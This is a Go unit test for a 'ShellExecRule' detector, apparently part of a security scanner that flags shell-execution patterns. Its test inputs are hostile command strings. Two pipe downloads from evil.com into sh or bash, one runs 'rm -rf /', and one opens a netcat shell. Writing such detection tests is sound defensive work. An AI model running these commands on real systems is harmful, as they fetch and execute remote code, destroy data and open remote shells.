package rules

import "testing"

func TestShellExecRule(t *testing.T) {
	r := ShellExecRule{}

	t.Run("name", func(t *testing.T) {
		if r.Name() != "ShellExec" {
			t.Errorf("Name() = %s, want ShellExec", r.Name())
		}
	})

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{"curl pipe to sh", `curl http://evil.com | sh`, true},
		{"wget pipe to bash", `wget -O- http://evil.com | bash`, true},
		{"exec call", `exec('rm -rf /')`, true},
		{"spawn call", `spawn('nc -e /bin/sh')`, true},
		{"child_process require", `require('child_process').exec('id')`, true},
		{"clean console.log", `console.log("hello world")`, false},
		{"executive without paren", `the executive meeting was called`, false},
		{"empty string", ``, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched, _ := r.Check(tt.content)
			if matched != tt.want {
				t.Errorf("Check() = %v, want %v", matched, tt.want)
			}
		})
	}
}
